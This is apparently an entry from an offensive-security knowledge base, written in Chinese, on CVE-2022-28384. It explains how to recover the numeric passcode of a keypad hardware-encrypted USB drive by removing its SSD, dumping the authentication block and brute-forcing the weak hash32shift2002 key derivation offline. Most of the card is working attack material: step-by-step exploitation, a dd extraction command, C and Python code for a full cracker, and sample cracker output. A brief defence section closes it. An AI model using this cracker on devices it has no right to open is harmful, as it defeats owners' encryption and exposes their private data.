---
id: iot-hardware-usb-encrypted-drive-offline-passcode-crack
title: 硬件加密 USB 盘离线破解：认证 magic 块 + hash32shift2002 密钥派生枚举数字密码
type: scenario
domain: iot
path: iot/hardware
technique: hw-encrypted-usb-offline-passcode-bruteforce
aliases:
- 硬件加密U盘破解
- Keypad Secure 破解
- hash32shift2002
- 认证块 magic
- USB 加密盘离线暴力破解
tags:
- iot
- hardware
- usb
- aes
- hash32shift2002
- brute-force
- spi
- crypto
cve:
- CVE-2022-28384
severity: high
confidence: high
status: verified
created: '2026-11-11'
updated: '2026-11-11'
verification:
  verified_by: verifier-V514
  verified_at: '2026-11-11T11:48:35+08:00'
  notes: '已对照原文、英文原博客与全部17张截图：CVE-2022-28384 经 NVD 确认为可离线暴力破解密码；认证块 #125042696、使用前 0x70 字节、magic 0x494e4920、12 个 1 的 SPI payload 为 0AC91F2F 三次 + 956669AD + 16 字节 0xFF、AES_key=reversed(前16)+reversed(后16) 均一致。修正 PoC 关键算法细节：原文表格的 4 位输入不是直接对十进制整数哈希，按每位数字展开成 0xdd 字节拼 32 位整数（1111→0x11111111、1234→0x11223344）可复现表格，已改写密钥派生与枚举范围（5-12 位，10^4-10^12）；原文 6666 行 7E657A68 疑为笔误（按编码计算为 7E657AF8）。原文未给出不足 4 位尾组的报文样例，卡片已注明尾组编码需实测校准。dedup 无同链候选；硬件产品原文无固件版本，不设 affected_versions。'
---

## 一句话结论

带键盘的 AES 硬件加密 USB 盘把密码认证信息保存在 SSD 上的固定块，并用整数哈希 `hash32shift2002` 从 5~12 位数字密码派生 AES 密钥；攻击者物理拆出 M.2 SSD 读取该认证块后，可在本地离线枚举数字密码空间，逐候选派生密钥解密认证块并匹配 magic `0x494e4920`，从而恢复密码并解密全部数据。

## 原理

- **认证设计**：设备把用户密码与加密密钥绑定——解锁时键盘控制器通过 SPI 把 32 字节 payload 发给 USB-SATA 桥接控制器，桥接控制器的 AES 引擎用它解密 SSD 上一个特殊认证块的前 0x70（112）字节，解密结果前 4 字节必须等于 magic `"INI "`（`0x494e4920`）才认为密码正确。
- **弱密钥派生**：数字密码按 4 位一组处理：每位数字 d 展开成字节 `0xdd` 拼成 32 位整数（原文表格可由该编码复现：1111→`0x11111111`、1234→`0x11223344`），再经 `hash32shift2002`（Thomas Wang 的整数哈希）映射成 32 位哈希；4 组哈希按序拼接，不足 4 组用原文的 no-input 常量 `956669AD` 补齐，最后追加 16 字节 `0xFF` 构成 32 字节 payload（例如输入 12 个 `1` 得到 `0AC91F2F` 重复 3 次 + `956669AD` + 16 字节 `0xFF`），校验和用 XMODEM CRC-16；桥接芯片使用特殊字节序：`AES_key = reversed(payload[0:16]) + reversed(payload[16:32])`。
- **为什么可离线破解**：认证块在 SSD 上、密钥派生完全由公开算法与密码决定，整个校验不需要设备参与；密码空间只有 5~12 位纯数字，且哈希计算极快，桌面 CPU 可枚举。与在线猜 PIN 不同，此攻击完全离线、无次数限制、不可被设备锁定逻辑发现。
- **攻击前提**：物理接触设备并能读取裸 SSD（该型号内部就是标准 M.2 SATA SSD，可装入通用 M.2 硬盘盒读取），以及知道认证块编号（通过多次设置不同密码观察 SSD 内容变化定位；64GB 测试机为 125042696 号块）。

## 触发条件

- 硬件加密存储设备的用户密码经弱哈希/简单 KDF 派生磁盘加密密钥，且认证校验可在设备外完成（认证块对攻击者可读）。
- 密码空间有限（如只允许 5~12 位数字）。
- 攻击者可物理拆解设备并读取存储介质（M.2 SSD、eMMC、直接读块设备等）。
- 认证块位置/格式可通过设置不同密码对比或固件分析确定。

## 利用步骤

1. 拆解设备，识别 NAND、内存控制器与 USB-SATA 桥接控制器；若内部是标准 M.2 SSD，装入通用 M.2 硬盘盒即可读块设备。
2. 设置多个不同密码并对比 SSD 内容，定位随密码变化的认证特殊块（测试机为 125042696 号块，512 字节）；用 `dd` 单独取出。
3. 抓取键盘控制器到桥接控制器的 SPI 通信，建立「输入数字 → 32 字节 payload」样本（如 1111 → `0AC91F2F`），逆向识别整数哈希为 `hash32shift2002`。
4. 编写离线 cracker：对候选数字密码按 4 位分组、同样编码后计算 `hash32shift2002`，按 `reversed(前16) + reversed(后16)` 构造 AES 密钥，解密认证块前 0x70 字节，检查前 4 字节是否为 `0x494e4920`。
5. 命中即得到密码：可正常解锁设备，或直接用该密钥/AES 引擎解密盘上全部数据。

## PoC

整数哈希（分析确认的算法）：

```c
uint32_t hash32shift2002(uint32_t hash) {
    hash += ~(hash << 15);
    hash ^=  (hash >> 10);
    hash +=  (hash <<  3);
    hash ^=  (hash >>  6);
    hash += ~(hash << 11);
    hash ^=  (hash >> 16);
    return hash;
}
```

读取认证块并离线枚举（结构示意）：

```bash
# 取出特殊块（块号从设置不同密码的对比中定位）
dd if=/dev/sda bs=512 skip=125042696 count=1 of=ciphertext_block.bin
```

```python
from Crypto.Cipher import AES

NO_INPUT_HASH = 0x956669AD        # 原文表格 "no input" 的哈希
MAGIC = b'INI '                   # 0x494e4920

def hash32shift2002(x: int) -> int:
    x &= 0xffffffff
    x = (x + (~(x << 15) & 0xffffffff)) & 0xffffffff
    x ^= x >> 10
    x = (x + (x << 3)) & 0xffffffff
    x ^= x >> 6
    x = (x + (~(x << 11) & 0xffffffff)) & 0xffffffff
    x ^= x >> 16
    return x & 0xffffffff

def group_hash(group: str) -> int:
    # 由原文表格反推的 4 位输入编码：每位数字 d 展开成字节 0xdd 后拼成 32 位整数
    # （1234 -> 0x11223344 -> E097BCF8，1111 -> 0x11111111 -> 0AC91F2F）
    # 注：原文表格 6666 一行写作 7E657A68，按该编码计算为 7E657AF8，疑为原文笔误，其余各行均吻合
    # 注：原文只给出完整 4 位组与 no-input 的样例，不足 4 位的尾组如何补位未说明，
    #     实战需用设备实测 SPI 报文校准尾组编码
    packed = int.from_bytes(bytes(int(c) * 0x11 for c in group), 'big')
    return hash32shift2002(packed)

def passcode_key(passcode: str) -> bytes:
    groups = [passcode[i:i+4] for i in range(0, len(passcode), 4)][:4]
    hashes = [group_hash(g) for g in groups]
    hashes += [NO_INPUT_HASH] * (4 - len(hashes))    # 不足 4 组补 no-input 哈希
    payload = b''.join(h.to_bytes(4, 'big') for h in hashes) + b'\xff' * 16
    return payload[:16][::-1] + payload[16:32][::-1]  # 桥接芯片字节序

block = open('ciphertext_block.bin', 'rb').read(0x70)   # 认证块前 112 字节
for length in range(5, 13):                              # 5~12 位纯数字
    for n in range(10 ** (length - 1), 10 ** length):
        candidate = str(n)
        key = passcode_key(candidate)
        if AES.new(key, AES.MODE_ECB).decrypt(block)[:4] == MAGIC:
            print('passcode:', candidate)
            raise SystemExit
```

工具化跑分示意（原文同款 cracker 输出）：

```text
[*] Reading magic sector from device /dev/sda
[*] Found a plausible magic sector (#49428)
[*] Initialize passcode hash table
[*] Start cracking ...
[+] Success!
    The passcode is: 99999999
```

## 变体与关联

- 变体：其他键盘/指纹硬件加密盘只要把 PIN 映射为密钥并由设备外可验证的认证块校验，就能套用「定位认证块 → 还原 KDF → 离线枚举」流程；PIN 空间更小（4 位）时几乎即时破解。
- 关联：[[iot-hardware-spi-firmware-crc16-patch-aes-key-extract]]（固件补丁直接读 AES 密钥缓冲，免去密码推导）、[[crypto-aes-hardware-encrypted-usb-ecb-pattern-leak]]（同设备 ECB 模式泄露）、[[iot-hardware-usb-pin-retry-lockout-bypass]]（在线重试锁定失效）。
- 边界：若密码经带随机 salt 的慢 KDF（高迭代 PBKDF2/Argon2）派生且认证块含 salt、或认证在不可读安全元件内完成，该离线枚举不成立。

## 检测与防御

- 修复：密码派生用慢 KDF + 每设备随机 salt；认证校验依赖安全元件内的不可导出密钥；不要把可离线验证的认证块暴露在普通 SSD 上。
- 加固：增加 PIN 空间与复杂度限制（限制在线尝试次数对离线攻击无效，重点是让离线校验不可行）；密钥与认证信息放入防拆安全芯片。
- 检测（蓝队视角）：异常读取固定块、反复设置密码导致认证块频繁变化；对丢失设备取证时注意 M.2 介质被拆出的痕迹。
